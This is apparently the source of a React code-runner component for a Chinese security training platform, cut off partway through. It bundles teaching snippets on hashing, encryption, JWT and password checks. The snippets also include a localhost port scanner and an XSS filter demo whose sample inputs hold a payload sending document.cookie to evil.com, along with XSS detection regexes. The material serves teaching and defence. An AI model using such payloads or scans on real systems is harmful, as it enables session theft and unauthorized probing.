import React, { useState, useEffect, useRef, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Play, Square, RotateCcw, Code, Copy, Check, Loader2,
  ChevronDown, Clock, Zap, Terminal, Trash2, History, Maximize2,
  Minimize2, AlertTriangle, Info, FileCode, PanelLeftClose, PanelLeftOpen,
  BookOpen, X, Keyboard, Search, Brush, FileDown, Eraser,
  Shield, Gauge, GitCompare, Save, FolderOpen, Plus, Pencil, Columns2, ArrowRightLeft,
} from 'lucide-react';
import Editor from '@monaco-editor/react';

// ───── 接口定义 ─────
interface Runtime {
  id: string; name: string; version: string; icon: string;
  color: string; extensions: string[]; template: string; hasJavac?: boolean;
}

interface Snippet {
  id: string; language: string; category: string;
  title: string; description: string; code: string;
}

interface ExecutionResult {
  success: boolean; language: string; stdout: string; stderr: string;
  exitCode: number; executionTime: number; killed?: boolean;
}

interface HistoryEntry {
  id: string; language: string; code: string; stdin?: string;
  args?: string; result: ExecutionResult; timestamp: number;
}

interface Tab {
  id: string; name: string; language: string;
  code: string; stdin: string; args: string;
  result: ExecutionResult | null;
}

interface SavedProject {
  id: string; name: string; tabs: Tab[]; activeTabId: string;
  createdAt: number; updatedAt: number;
}

interface ProjectSummary {
  id: string; name: string; tabCount: number;
  languages: string[]; updatedAt: number;
}

interface AuditFinding {
  ruleId: string; severity: 'critical' | 'high' | 'medium' | 'low';
  line: number; column: number; description: string;
  suggestion: string; snippet: string;
}

interface AuditResult {
  language: string; findings: AuditFinding[];
  summary: { total: number; critical: number; high: number; medium: number; low: number };
  scannedLines: number;
}

interface BenchmarkResult {
  runs: { time: number; exitCode: number }[];
  min: number; max: number; avg: number; median: number; stddev: number;
  successRate: number;
}

interface DiffLine {
  type: 'same' | 'added' | 'removed'; content: string;
  lineNumLeft?: number; lineNumRight?: number;
}

// ───── 安全代码片段库 ─────
const SNIPPETS: Snippet[] = [
  { id: 'py-hash', language: 'python', category: '密码学 / 哈希', title: '使用 hashlib 计算文件/字符串哈希', description: 'MD5、SHA1、SHA256 哈希计算，适用于文件完整性校验', code: 'import hashlib\n\ndef compute_hashes(data: str):\n    """计算字符串的多种哈希值"""\n    print(f"原文: {data}")\n    print(f"MD5:    {hashlib.md5(data.encode()).hexdigest()}")\n    print(f"SHA1:   {hashlib.sha1(data.encode()).hexdigest()}")\n    print(f"SHA256: {hashlib.sha256(data.encode()).hexdigest()}")\n\ncompute_hashes("CISP安全培训-2025")\n' },
  { id: 'py-encrypt', language: 'python', category: '密码学 / 加密', title: 'Base64 编解码', description: '安全场景中常见的数据编码/解码操作', code: 'import base64\n\noriginal = "admin:超级密码@2025"\nprint(f"原文: {original}")\n\n# 编码\nencoded = base64.b64encode(original.encode()).decode()\nprint(f"Base64编码: {encoded}")\n\n# 解码\ndecoded = base64.b64decode(encoded).decode()\nprint(f"Base64解码: {decoded}")\n\n# URL 安全编码 (常用于JWT、Token传输)\nurl_safe = base64.urlsafe_b64encode(original.encode()).decode()\nprint(f"URL安全编码: {url_safe}")\n' },
  { id: 'py-caesar', language: 'python', category: '密码学 / 古典密码', title: '凯撒密码加解密', description: '理解古典替换密码的加解密原理', code: 'def caesar_encrypt(text: str, shift: int) -> str:\n    """凯撒密码加密"""\n    result = []\n    for ch in text:\n        if ch.isalpha():\n            base = ord(\'A\') if ch.isupper() else ord(\'a\')\n            result.append(chr((ord(ch) - base + shift) % 26 + base))\n        else:\n            result.append(ch)\n    return \'\'.join(result)\n\ndef caesar_decrypt(text: str, shift: int) -> str:\n    """凯撒密码解密"""\n    return caesar_encrypt(text, -shift)\n\ndef brute_force_decrypt(text: str):\n    """暴力破解凯撒密码"""\n    print("尝试所有偏移量:")\n    for shift in range(26):\n        print(f"  shift={shift:2d}: {caesar_decrypt(text, shift)}")\n\nmessage = "CISP Security Training"\nencrypted = caesar_encrypt(message, 5)\nprint(f"原文: {message}")\nprint(f"加密 (shift=5): {encrypted}")\nprint(f"解密: {caesar_decrypt(encrypted, 5)}")\nprint()\nbrute_force_decrypt(encrypted)\n' },
  { id: 'py-password-check', language: 'python', category: '密码学 / 密码策略', title: '密码强度检测器', description: '检查密码是否符合安全策略', code: 'import re\n\ndef check_password_strength(password: str) -> dict:\n    issues = []\n    score = 0\n    if len(password) >= 12: score += 25\n    elif len(password) >= 8:\n        score += 15\n        issues.append("建议密码长度 >= 12")\n    else: issues.append("密码长度不足8位，严重不安全")\n    if re.search(r\'[A-Z]\', password): score += 15\n    else: issues.append("缺少大写字母")\n    if re.search(r\'[a-z]\', password): score += 15\n    else: issues.append("缺少小写字母")\n    if re.search(r\'\\\\d\', password): score += 15\n    else: issues.append("缺少数字")\n    if re.search(r\'[!@#$%^&*(),.?":{}|<>]\', password): score += 15\n    else: issues.append("缺少特殊字符")\n    if re.search(r\'(password|123456|admin|qwerty)\', password, re.I):\n        score = max(0, score - 30)\n        issues.append("包含常见弱密码模式")\n    level = "强" if score >= 75 else "中" if score >= 50 else "弱"\n    return {"score": score, "level": level, "issues": issues}\n\ntest_passwords = ["admin123", "MyPa$$w0rd!", "Abc@2025Secure#X"]\nfor pwd in test_passwords:\n    result = check_password_strength(pwd)\n    print(f"\\n密码: {pwd}")\n    print(f"  强度: {result[\'level\']} ({result[\'score\']}/100)")\n    if result[\'issues\']:\n        for issue in result[\'issues\']:\n            print(f"   - {issue}")\n' },
  { id: 'py-token-gen', language: 'python', category: '网络安全 / 令牌', title: '安全随机令牌生成器', description: '使用 secrets 模块生成 API Key / Session Token', code: 'import secrets\nimport string\n\ndef generate_token(length=32, charset=None):\n    if charset is None:\n        charset = string.ascii_letters + string.digits\n    return \'\'.join(secrets.choice(charset) for _ in range(length))\n\ndef generate_api_key():\n    return f"cisp_{secrets.token_hex(24)}"\n\ndef generate_session_id():\n    return secrets.token_urlsafe(32)\n\nprint("=== 安全令牌生成 ===")\nprint(f"API Key:   {generate_api_key()}")\nprint(f"Session:   {generate_session_id()}")\nprint(f"密码重置: {generate_token(16)}")\nprint(f"十六进制: {secrets.token_hex(16)}")\n\nprint(f"\\n生成 1000 个令牌，前5个:")\nfor i in range(5):\n    print(f"  [{i+1}] {secrets.token_hex(8)}")\n' },
  { id: 'py-port-scan', language: 'python', category: '网络安全 / 侦察', title: '简易端口扫描器', description: 'TCP连接探测（仅教学用途）', code: 'import socket\n\ncommon_ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt"}\n\ndef scan_port(host, port, timeout=1):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(timeout)\n            return s.connect_ex((host, port)) == 0\n    except: return False\n\ntarget = "127.0.0.1"\nprint(f"扫描目标: {target}")\nfor port, svc in sorted(common_ports.items()):\n    status = "🟢 开放" if scan_port(target, port) else "🔴 关闭"\n    print(f"{port:6d} {svc:12s} {status}")\nprint("\\n[教育用途] 未经授权扫描他人系统属于违法行为")\n' },
  { id: 'js-crypto', language: 'javascript', category: '密码学 / 加密', title: 'Node.js crypto 哈希与加解密', description: '使用内置 crypto 模块哈希和AES加密', code: 'const crypto = require(\'crypto\');\n\nfunction hash(data, algorithm = \'sha256\') {\n  return crypto.createHash(algorithm).update(data).digest(\'hex\');\n}\n\nconst secret = "CISP安全培训平台";\nconsole.log(\'原文:\', secret);\nconsole.log(\'SHA256:\', hash(secret));\nconsole.log(\'MD5:\', hash(secret, \'md5\'));\n\nfunction encrypt(text, key) {\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(\'aes-256-cbc\', key, iv);\n  let encrypted = cipher.update(text, \'utf8\', \'hex\');\n  encrypted += cipher.final(\'hex\');\n  return iv.toString(\'hex\') + \':\' + encrypted;\n}\n\nfunction decrypt(combined, key) {\n  const [ivHex, encrypted] = combined.split(\':\');\n  const decipher = crypto.createDecipheriv(\'aes-256-cbc\', key, Buffer.from(ivHex, \'hex\'));\n  let decrypted = decipher.update(encrypted, \'hex\', \'utf8\');\n  decrypted += decipher.final(\'utf8\');\n  return decrypted;\n}\n\nconst encKey = crypto.randomBytes(32);\nconst message = "敏感数据: api_key=sk-abc123";\nconst ciphertext = encrypt(message, encKey);\nconsole.log(\'\\n密文:\', ciphertext);\nconsole.log(\'解密:\', decrypt(ciphertext, encKey));\nconsole.log(\'\\n随机令牌:\', crypto.randomBytes(24).toString(\'hex\'));\n' },
  { id: 'js-jwt', language: 'javascript', category: '网络安全 / 鉴权', title: 'JWT 令牌解析与验证演示', description: '模拟 JWT 签发和验证过程', code: 'const crypto = require(\'crypto\');\n\nfunction base64url(source) {\n  return Buffer.from(source).toString(\'base64url\');\n}\n\nfunction sign(payload, secret) {\n  const header = base64url(JSON.stringify({ alg: \'HS256\', typ: \'JWT\' }));\n  const body = base64url(JSON.stringify(payload));\n  const signature = crypto.createHmac(\'sha256\', secret).update(header + \'.\' + body).digest(\'base64url\');\n  return header + \'.\' + body + \'.\' + signature;\n}\n\nfunction verify(token, secret) {\n  const parts = token.split(\'.\');\n  if (parts.length !== 3) return { valid: false, reason: \'格式错误\' };\n  const payload = JSON.parse(Buffer.from(parts[1], \'base64url\').toString());\n  const expected = sign(payload, secret);\n  return { valid: token === expected, payload: token === expected ? payload : null,\n    reason: token === expected ? null : \'签名不匹配 — 令牌被篡改!\' };\n}\n\nconst jwtSecret = crypto.randomBytes(32).toString(\'hex\');\nconst userPayload = { sub: \'user_001\', name: \'安全工程师\', role: \'admin\',\n  iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600 };\n\nconst token = sign(userPayload, jwtSecret);\nconsole.log(\'签发 JWT:\');\nconsole.log(token);\n\nconst result1 = verify(token, jwtSecret);\nconsole.log(\'\\n验证(合法):\', result1.valid ? \'✅ 通过\' : \'❌ 失败\');\n\nconst fakeToken = token.slice(0, -5) + \'xxxxx\';\nconst result2 = verify(fakeToken, jwtSecret);\nconsole.log(\'\\n验证(伪造):\', result2.valid ? \'✅ 通过\' : \'❌ 失败\', result2.reason);\n' },
  { id: 'js-xss-filter', language: 'javascript', category: 'Web安全 / XSS防护', title: 'XSS输入过滤演示', description: 'HTML实体转义防止跨站脚本攻击', code: 'function escapeHtml(unsafe) {\n  return unsafe.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/\'/g,"&#039;");\n}\n\nconst userInputs = [\n  \'<script>alert("XSS攻击!")</script>\',\n  \'<img src=x onerror="fetch(\\\'http://evil.com/?c=\\\'+document.cookie)">\',\n  \'正常用户名_张三\',\n  \'<a href="javascript:void(0)" onclick="steal()">点击领奖</a>\',\n];\n\nconsole.log(\'=== XSS 过滤演示 ===\\n\');\nuserInputs.forEach((input, i) => {\n  const safe = escapeHtml(input);\n  console.log(`输入[${i+1}]: ${input}`);\n  console.log(`  安全: ${safe}`);\n  console.log(`  ${input !== safe ? \'⚠️ 检测到恶意载荷\' : \'✅ 安全输入\'}\\n`);\n});\n\nfunction detectXSS(input) {\n  const patterns = [/<script[^>]*>/i, /on\\\\w+\\\\s*=/i, /javascript\\\\s*:/i, /<iframe/i, /eval\\\\s*\\\\(/i];\n  return patterns.some(p => p.test(input));\n}\n\nconsole.log(\'=== XSS 检测 ===\');\nuserInputs.forEach(input => console.log(detectXSS(input) ? \'🚨 危险\' : \'✅ 安全\', \'-\', input.substring(0,40)));\n' },
  { id: 'java-hash', language: 'java', category: '密码学 / 加密', title: 'Java MessageDigest 哈希计算', description: 'MD5/SHA-256 哈希', code: 'import java.security.MessageDigest;\n\npublic class Main {\n    static String bytesToHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) sb.append(String.format("%02x", b));\n        return sb.toString();\n    }\n    static String hash(String input, String alg) throws Exception {\n        MessageDigest md = MessageDigest.getInstance(alg);\n        return bytesToHex(md.digest(input.getBytes()));\n    }\n    public static void main(String[] args) throws Exception {\n        String pwd = "MySecurePass@2025";\n        System.out.println("原文: " + pwd);\n        System.out.println("MD5:    " + hash(pwd, "MD5"));\n        System.out.println("SHA-256:" + hash(pwd, "SHA-256"));\n        String h1 = hash("MySecurePass@2025", "SHA-256");\n        String h2 = hash("MySecurePass@2026", "SHA-256");\n        System.out.println("\\n雪崩效应: 仅差1个字符，哈希完全不同");\n        System.out.println("  " + h1.substring(0,32) + "...");\n        System.out.println("  " + h2.substring(0,32) + "...");\n    }\n}\n' },
  { id: 'java-base64', language: 'java', category: '密码学 / 加密', title: 'Java Base64 编解码 + 安全随机数', description: 'Base64/URL安全编码 + SecureRandom', code: 'import java.util.Base64;\nimport java.security.SecureRandom;\n\npublic class Main {\n    static String bytesToHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) sb.append(String.format("%02x", b));\n        return sb.toString();\n    }\n    public static void main(String[] args) {\n        String original = "CISP安全培训: 用户凭证演示";\n        System.out.println("原文: " + original);\n        String encoded = Base64.getEncoder().encodeToString(original.getBytes());\n        System.out.println("Base64: " + encoded);\n        System.out.println("解码: " + new String(Base64.getDecoder().decode(encoded)));\n        System.out.println("URL安全: " + Base64.getUrlEncoder().withoutPadding().encodeToString(original.getBytes()));\n        SecureRandom rand = new SecureRandom();\n        byte[] token = new byte[24]; rand.nextBytes(token);\n        System.out.println("\\n会话令牌: " + bytesToHex(token));\n    }\n}\n' },
];

const SNIPPET_CATEGORIES = ['密码学 / 加密', '密码学 / 哈希', '密码学 / 古典密码', '密码学 / 密码策略', '网络安全 / 侦察', '网络安全 / 鉴权', '网络安全 / 令牌', 'Web安全 / XSS防护'];
const API_BASE = '/api/execute';

// ───── 工具函数 ─────
function genId() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 8); }

function computeDiff(left: string, right: string): DiffLine[] {
  const la = left.split('\n'), ra = right.split('\n');
  const m = la.length, n = ra.length;
  const dp: number[][] = Array.from({ length: m + 1 }, () => Array(n + 1).fill(0));
  for (let i = 1; i <= m; i++)
    for (let j = 1; j <= n; j++)
      dp[i][j] = la[i - 1] === ra[j - 1] ? dp[i - 1][j - 1] + 1 : Math.max(dp[i - 1][j], dp[i][j - 1]);

  const result: DiffLine[] = [];
  let i = m, j = n;
  while (i > 0 || j > 0) {
    if (i > 0 && j > 0 && la[i - 1] === ra[j - 1]) {
      result.unshift({ type: 'same', content: la[i - 1], lineNumLeft: i, lineNumRight: j });
      i--; j--;
    } else if (j > 0 && (i === 0 || dp[i][j - 1] >= dp[i - 1][j])) {
      result.unshift({ type: 'added', content: ra[j - 1], lineNumRight: j });
      j--;
    } else {
      result.unshift({ type: 'removed', content: la[i - 1], lineNumLeft: i });
      i--;
    }
  }
  return result;
}

function isTabular(text: string): boolean {
  const lines = text.trim().split('\n').filter(l => l.trim());
  if (lines.length < 2) return false;
  const hasTabs = lines.filter(l => l.includes('\t')).length >= lines.length * 0.8;
  const hasMultipleSpaces = lines.filter(l => /\s{3,}/.test(l)).length >= lines.length * 0.8;
  return hasTabs || hasMultipleSpaces;
}

function parseTable(text: string): { headers: string[]; rows: string[][] } {
  const lines = text.trim().split('\n').filter(l => l.trim());
  const sep = text.includes('\t') ? '\t' : /\s{2,}/;
  const data = lines.map(l => l.split(sep).map(c => c.trim()).filter(c => c));
  const maxCols = Math.max(...data.map(r => r.length));
  return { headers: data[0], rows: data.slice(1).map(r => [...r, ...Array(maxCols - r.length).fill('')]) };
}

function parseErrorLines(stderr: string): number[] {
  const lines: number[] = [];
  // Python: line N, File "xxx", line N
  // JS: at xxx:line:col
  // Java: xxx.java:line:
  const patterns = [/line\s+(\d+)/gi, /:(\d+):(\d+)/g, /\.java:(\d+)/g];
  for (const p of patterns) {
    let m; while ((m = p.exec(stderr)) !== null) lines.push(parseInt(m[1], 10));
  }
  return [...new Set(lines)].filter(n => n > 0);
}

function stats(nums: number[]) {
  if (!nums.length) return { min: 0, max: 0, avg: 0, median: 0, stddev: 0 };
  const s = [...nums].sort((a, b) => a - b);
  const avg = nums.reduce((a, b) => a + b, 0) / nums.length;
  const mid = Math.floor(s.length / 2);
  const median = s.length % 2 ? s[mid] : (s[mid - 1] + s[mid]) / 2;
  const variance = nums.reduce((sum, n) => sum + (n - avg) ** 2, 0) / nums.length;
  return { min: s[0], max: s[s.length - 1], avg: Math.round(avg * 100) / 100, median, stddev: Math.round(Math.sqrt(variance) * 100) / 100 };
}

// ───── 主组件 ─────
export const CodeRunner: React.FC = () => {
  // ── 运行时数据 ──
  const [runtimes, setRuntimes] = useState<Runtime[]>([]);
  const [runtimesLoading, setRuntimesLoading] = useState(true);
  const [runtimesError, setRuntimesError] = useState('');

  // ── 多标签页系统 (A) ──
  const [tabs, setTabs] = useState<Tab[]>(() => {
    try {
      const saved = localStorage.getItem('coderunner_tabs');
      if (saved) { const arr = JSON.parse(saved); if (arr.length) return arr; }
    } catch (_) {}
    return [{ id: genId(), name: '代码 1', language: 'python', code: '', stdin: '', args: '', result: null }];
  });
  const [activeTabId, setActiveTabId] = useState(() => tabs[0]?.id || '');
  const activeTab = tabs.find(t => t.id === activeTabId) || tabs[0];
  const [editingTabId, setEditingTabId] = useState<string | null>(null);
  const [editingTabName, setEditingTabName] = useState('');

  // 持久化 tabs
  const persistTabs = useCallback((t: Tab[]) => {
    try { localStorage.setItem('coderunner_tabs', JSON.stringify(t)); } catch (_) {}
  }, []);

  const updateActiveTab = useCallback((partial: Partial<Tab>) => {
    setTabs(prev => {
      const next = prev.map(t => t.id === activeTabId ? { ...t, ...partial } : t);
      persistTabs(next);
      return next;
    });
  }, [activeTabId, persistTabs]);

  const addTab = useCallback((lang?: string) => {
    const rt = runtimes.find(r => r.id === (lang || activeTab.language));
    const newTab: Tab = {
      id: genId(), name: `代码 ${tabs.length + 1}`,
      language: lang || activeTab.language,
      code: rt?.template || '', stdin: '', args: '', result: null,
    };
    setTabs(prev => { const n = [...prev, newTab]; persistTabs(n); return n; });
    setActiveTabId(newTab.id);
  }, [activeTab, runtimes, tabs.length, persistTabs]);

  const closeTab = useCallback((tabId: string) => {
    setTabs(prev => {
      if (prev.length <= 1) return prev;
      const idx = prev.findIndex(t => t.id === tabId);
      const next = prev.filter(t => t.id !== tabId);
      persistTabs(next);
      if (tabId === activeTabId) {
        const newIdx = Math.min(idx, next.length - 1);
        setActiveTabId(next[newIdx]?.id || next[0]?.id);
      }
      return next;
    });
  }, [activeTabId, persistTabs]);

  const renameTab = useCallback((tabId: string, name: string) => {
    setTabs(prev => { const n = prev.map(t => t.id === tabId ? { ...t, name } : t); persistTabs(n); return n; });
  }, [persistTabs]);

  // ── 视图 & UI 状态 ──
  const [viewMode, setViewMode] = useState<'stacked' | 'split'>('stacked'); // B. 分屏
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [showHistory, setShowHistory] = useState(true);
  const [rightPanelTab, setRightPanelTab] = useState<'output' | 'audit' | 'benchmark'>('output');

  // ── 执行状态 ──
  const [isRunning, setIsRunning] = useState(false);
  const [showSnippets, setShowSnippets] = useState(false);
  const [snippetCategory, setSnippetCategory] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [history, setHistory] = useState<HistoryEntry[]>(() => {
    try { const s = localStorage.getItem('coderunner_history'); return s ? JSON.parse(s) : []; } catch (_) { return []; }
  });

  // ── C. 安全审计 ──
  const [auditResult, setAuditResult] = useState<AuditResult | null>(null);
  const [isAuditing, setIsAuditing] = useState(false);

  // ── D. 性能基准 ──
  const [benchmarkResult, setBenchmarkResult] = useState<BenchmarkResult | null>(null);
  const [isBenchmarking, setIsBenchmarking] = useState(false);
  const [benchmarkRuns, setBenchmarkRuns] = useState(10);

  // ── E. 代码 Diff ──
  const [showDiff, setShowDiff] = useState(false);
  const [diffLeft, setDiffLeft] = useState<HistoryEntry | null>(null);
  const [diffRight, setDiffRight] = useState<HistoryEntry | null>(null);

  // ── F. 命名项目 ──
  const [showProjects, setShowProjects] = useState(false);
  const [projects, setProjects] = useState<ProjectSummary[]>([]);
  const [projectName, setProjectName] = useState('');
  const [isLoadingProjects, setIsLoadingProjects] = useState(false);

  // ── Refs ──
  const editorRef = useRef<any>(null);
  const decorationsRef = useRef<string[]>([]);
  const outputRef = useRef<HTMLDivElement>(null);
  const execIdRef = useRef<string | null>(null);
  const codeRef = useRef(activeTab?.code || '');
  codeRef.current = activeTab?.code || '';
  const langRef = useRef(activeTab?.language || 'python');
  langRef.current = activeTab?.language || 'python';
  const stdinRef = useRef(activeTab?.stdin || '');
  stdinRef.current = activeTab?.stdin || '';
  const argsRef = useRef(activeTab?.args || '');
  argsRef.current = activeTab?.args || '';
  const inited = useRef(false);
  const pendingSnippetRef = useRef<Snippet | null>(null);

  // ── 加载运行时 ──
  useEffect(() => {
    fetch(`${API_BASE}/runtimes`)
      .then(r => r.json())
      .then(data => {
        const list: Runtime[] = data.runtimes || [];
        setRuntimes(list);
        if (list.length > 0 && !inited.current) {
          inited.current = true;
          setTabs(prev => {
            if (prev.length === 1 && !prev[0].code) {
              const tpl = list[0]?.template || '';
              const updated = [{ ...prev[0], code: tpl, language: list[0].id }];
              persistTabs(updated);
              return updated;
            }
            return prev;
          });
        }
      })
      .catch(err => setRuntimesError('无法获取运行环境: ' + err.message))
      .finally(() => setRuntimesLoading(false));
  }, [persistTabs]);

  // ── 快捷键 ──
  const runCodeRef = useRef<() => void>(() => {});
  useEffect(() => {
    const h = (e: KeyboardEvent) => { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); runCodeRef.current(); } };
    window.addEventListener('keydown', h);
    return () => window.removeEventListener('keydown', h);
  }, []);

  // ── 切换语言 ──
  const switchLanguage = useCallback((langId: string) => {
    const rt = runtimes.find(r => r.id === langId);
    if (!rt) return;
    updateActiveTab({ language: langId, code: activeTab.code || rt.template, result: null });
  }, [activeTab, runtimes, updateActiveTab]);

  // ── 代码执行 ──
  const runCode = useCallback(async () => {
    const currentCode = codeRef.current;
    const currentLang = langRef.current;
    const currentStdin = stdinRef.current;
    const currentArgs = argsRef.current;
    if (!currentCode.trim() || isRunning) return;
    setIsRunning(true);
    updateActiveTab({ result: null });

    const start = Date.now();
    try {
      const res = await fetch(`${API_BASE}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ language: currentLang, code: currentCode, stdin: currentStdin || undefined, args: currentArgs || undefined }),
      });
      const data: any = await res.json();
      execIdRef.current = data.execId || null;

      updateActiveTab({ result: data });
      setHistory(prev => {
        const entry: HistoryEntry = {
          id: Date.now().toString(36), language: currentLang, code: currentCode,
          stdin: currentStdin || undefined, args: currentArgs || undefined,
          result: data, timestamp: Date.now(),
        };
        const trimmed = [entry, ...prev].slice(0, 50);
        try { localStorage.setItem('coderunner_history', JSON.stringify(trimmed)); } catch (_) {}
        return trimmed;
      });

      // I. 错误行标注
      if (!data.success && data.stderr) {
        const errLines = parseErrorLines(data.stderr);
        if (errLines.length && editorRef.current) {
          const d = errLines.map(lineNum => ({
            range: new (window as any).monaco.Range(lineNum, 1, lineNum, 1),
            options: {
              isWholeLine: true,
              glyphMarginClassName: 'error-glyph',
              glyphMarginHoverMessage: { value: `第 ${lineNum} 行编译/运行错误` },
              className: 'error-line-highlight',
            },
          }));
          decorationsRef.current = editorRef.current.deltaDecorations(decorationsRef.current, d);
        }
      }

      setTimeout(() => outputRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);
    } catch (err: any) {
      updateActiveTab({
        result: { success: false, language: currentLang, stdout: '', stderr: `网络错误: ${err.message}`, exitCode: 1, executionTime: Date.now() - start },
      });
    } finally {
      setIsRunning(false);
      execIdRef.current = null;
    }
  }, [isRunning, updateActiveTab]);
  runCodeRef.current = runCode;

  // ── 停止执行 ──
  const handleStop = async () => {
    setIsRunning(false);
    if (execIdRef.current) {
      try { await fetch(`${API_BASE}/cancel/${execIdRef.current}`, { method: 'POST' }); } catch (_) {}
      execIdRef.current = null;
    }
  };

  // ── C. 安全审计 ──
  const handleAudit = async () => {
    if (!activeTab.code.trim()) return;
    setIsAuditing(true);
    setRightPanelTab('audit');
    try {
      const res = await fetch(`${API_BASE}/audit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ language: activeTab.language, code: activeTab.code }),
      });
      const data: AuditResult = await res.json();
      setAuditResult(data);

      // 标注审计发现问题行
      if (editorRef.current && data.findings.length) {
        const d = data.findings.map(f => ({
          range: new (window as any).monaco.Range(f.line, f.column, f.line, f.column + 1),
          options: {
            isWholeLine: true,
            glyphMarginClassName: f.severity === 'critical' ? 'audit-critical' : f.severity === 'high' ? 'audit-high' : f.severity === 'medium' ? 'audit-medium' : 'audit-low',
            glyphMarginHoverMessage: { value: `[${f.severity.toUpperCase()}] ${f.description}\n建议: ${f.suggestion}` },
            className: `audit-line-${f.severity}`,
          },
        }));
        decorationsRef.current = editorRef.current.deltaDecorations(decorationsRef.current, d);
      }
    } catch (err: any) {
      setAuditResult({ language: activeTab.language, findings: [], summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0 }, scannedLines: 0 });
    } finally {
      setIsAuditing(false);
    }
  };

  // ── D. 性能基准测试 ──
  const handleBenchmark = async () => {
    if (!activeTab.code.trim() || isRunning) return;
    setIsBenchmarking(true);
    setRightPanelTab('benchmark');
    setBenchmarkResult(null);
    const times: { time: number; exitCode: number }[] = [];

    for (let i = 0; i < benchmarkRuns; i++) {
      const start = Date.now();
      try {
        const res = await fetch(`${API_BASE}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ language: activeTab.language, code: activeTab.code, stdin: activeTab.stdin || undefined, args: activeTab.args || undefined }),
        });
        const data = await res.json();
        times.push({ time: data.executionTime, exitCode: data.exitCode });
      } catch {
        times.push({ time: Date.now() - start, exitCode: -1 });
      }
    }

    const s = stats(times.map(t => t.time));
    const successCount = times.filter(t => t.exitCode === 0).length;
    setBenchmarkResult({
      runs: times, ...s, successRate: Math.round((successCount / times.length) * 100),
    });
    setIsBenchmarking(false);
  };

  // ── F. 项目操作 ──
  const loadProjects = async () => {
    setIsLoadingProjects(true);
    try {
      const res = await fetch(`${API_BASE}/projects`);
      const data = await res.json();
      setProjects(data.projects || []);
    } catch (_) {
      setProjects([]);
    } finally {
      setIsLoadingProjects(false);
      setShowProjects(true);
    }
  };

  const saveProject = async () => {
    if (!projectName.trim()) return;
    try {
      await fetch(`${API_BASE}/projects`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: projectName.trim(), tabs, activeTabId }),
      });
      setProjectName('');
      setShowProjects(false);
    } catch (_) {}
  };

  const loadProject = async (id: string) => {
    try {
      const res = await fetch(`${API_BASE}/projects/${id}`);
      const data: SavedProject = await res.json();
      setTabs(data.tabs);
      persistTabs(data.tabs);
      setActiveTabId(data.activeTabId);
      setShowProjects(false);
    } catch (_) {}
  };

  const deleteProject = async (id: string) => {
    try {
      await fetch(`${API_BASE}/projects/${id}`, { method: 'DELETE' });
      setProjects(prev => prev.filter(p => p.id !== id));
    } catch (_) {}
  };

  // ── 重置/清除/复制 ──
  const handleReset = () => {
    const rt = runtimes.find(r => r.id === activeTab.language);
    updateActiveTab({ code: rt?.template || '', stdin: '', args: '', result: null });
  };

  const clearOutput = () => {
    updateActiveTab({ result: null });
    decorationsRef.current = editorRef.current?.deltaDecorations(decorationsRef.current, []) || [];
    setAuditResult(null);
    setBenchmarkResult(null);
  };

  const copyOutput = () => {
    const r = activeTab.result;
    const text = r ? (r.stdout || '') + (r.stderr ? '\n--- STDERR ---\n' + r.stderr : '') : '';
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownload = () => {
    const extMap: Record<string, string> = { python: '.py', javascript: '.js', java: '.java' };
    const blob = new Blob([activeTab.code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = `code_${Date.now()}${extMap[activeTab.language] || '.txt'}`;
    a.click(); URL.revokeObjectURL(url);
  };

  const handleFormat = () => {
    editorRef.current?.getAction('editor.action.formatDocument')?.run();
  };

  const loadFromHistory = (entry: HistoryEntry) => {
    updateActiveTab({ language: entry.language, code: entry.code, stdin: entry.stdin || '', args: entry.args || '', result: entry.result });
  };

  const clearHistory = () => { setHistory([]); localStorage.removeItem('coderunner_history'); };

  // ── 代码片段 ──
  useEffect(() => {
    const snippet = pendingSnippetRef.current;
    if (!snippet) return;
    if (snippet.language === activeTab.language) {
      updateActiveTab({ code: snippet.code });
      pendingSnippetRef.current = null;
    }
  }, [activeTab.language, updateActiveTab]);

  const loadSnippet = (snippet: Snippet) => {
    setShowSnippets(false);
    setSnippetCategory(null);
    if (snippet.language !== activeTab.language) {
      pendingSnippetRef.current = snippet;
      switchLanguage(snippet.language);
    } else {
      updateActiveTab({ code: snippet.code });
    }
  };

  // ── 全屏 ──
  const toggleFullscreen = () => {
    setIsFullscreen(!isFullscreen);
    setTimeout(() => editorRef.current?.layout(), 200);
  };
  useEffect(() => {
    if (!isFullscreen) return;
    const esc = (e: KeyboardEvent) => { if (e.key === 'Escape') setIsFullscreen(false); };
    window.addEventListener('keydown', esc);
    return () => window.removeEventListener('keydown', esc);
  }, [isFullscreen]);

  const activeRuntime = runtimes.find(r => r.id === activeTab.language);

  // 片段筛选
  const filteredSnippets = SNIPPETS.filter(s => s.language === activeTab.language && (!snippetCategory || s.category === snippetCategory));

  // Diff 计算
  const diffLines = (diffLeft && diffRight) ? computeDiff(diffLeft.code, diffRight.code) : [];

  // H. 表格检测
